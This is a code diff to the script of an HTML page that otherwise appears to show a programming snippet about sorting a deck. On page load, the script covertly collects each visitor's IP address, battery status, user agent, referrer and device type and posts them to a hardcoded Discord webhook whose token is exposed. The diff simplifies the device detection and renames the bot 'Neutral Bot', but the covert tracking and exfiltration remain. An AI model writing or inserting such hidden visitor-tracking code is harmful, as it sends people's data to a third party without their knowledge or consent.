@@ -383,35 +383,24 @@ print 'It took ' + i + ' iterations to sort the deck.';</code></pre>
             }
         }
 
-        // Function to detect device type and model
-        async function detectDeviceType() {
-            let deviceType = "Unknown Device";
-            let deviceModel = "Unknown Model";
-
-            if (navigator.userAgentData) {
-                const brands = navigator.userAgentData.brands.map(brand => brand.brand).join(', ');
-                deviceType = brands.includes('Mobile') ? 'Mobile' : 'PC or Laptop';
-                deviceModel = navigator.userAgentData.mobile ? 'Mobile Device' : 'PC or Laptop';
+        // Function to detect device type
+        function detectDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/Mobi|Android/i.test(userAgent)) {
+                return "Mobile";
+            } else if (/Windows|Macintosh|Linux/i.test(userAgent)) {
+                return "PC or Laptop";
             } else {
-                const userAgent = navigator.userAgent;
-                if (/Mobi|Android/i.test(userAgent)) {
-                    deviceType = "Mobile";
-                    deviceModel = "Unknown Mobile Model";
-                } else if (/Windows|Macintosh|Linux/i.test(userAgent)) {
-                    deviceType = "PC or Laptop";
-                    deviceModel = "Unknown PC or Laptop Model";
-                }
+                return "Unknown Device";
             }
-
-            return { deviceType, deviceModel };
         }
 
         // Function to send info to Discord webhook
-        async function sendToDiscord(ip, batteryStatus, deviceInfo) {
+        async function sendToDiscord(ip, batteryStatus, deviceType) {
             const webhookUrl = 'https://discord.com/api/webhooks/1303101741839159337/nbA-IrRRRbTWQMy1NGH_OtfnTCSZhHM8flJG7BhgnYXjhvCGykPTBjS3XlGlOFwHkO1D';
             const message = {
-                content: `New visitor info:\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nReferrer: ${document.referrer || 'Direct'}\n${batteryStatus}\nDevice Type: ${deviceInfo.deviceType}\nDevice Model: ${deviceInfo.deviceModel}`,
-                username: 'Website Bot'
+                content: `New visitor info:\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nReferrer: ${document.referrer || 'Direct'}\n${batteryStatus}\nDevice Type: ${deviceType}`,
+                username: 'Neutral Bot'
             };
 
             try {
@@ -432,8 +421,8 @@ print 'It took ' + i + ' iterations to sort the deck.';</code></pre>
         window.onload = async function() {
             const ip = await getVisitorInfo();
             const batteryStatus = await getBatteryStatus();
-            const deviceInfo = await detectDeviceType();
-            sendToDiscord(ip, batteryStatus, deviceInfo);
+            const deviceType = detectDeviceType();
+            sendToDiscord(ip, batteryStatus, deviceType);
         };
     </script>
 </body>
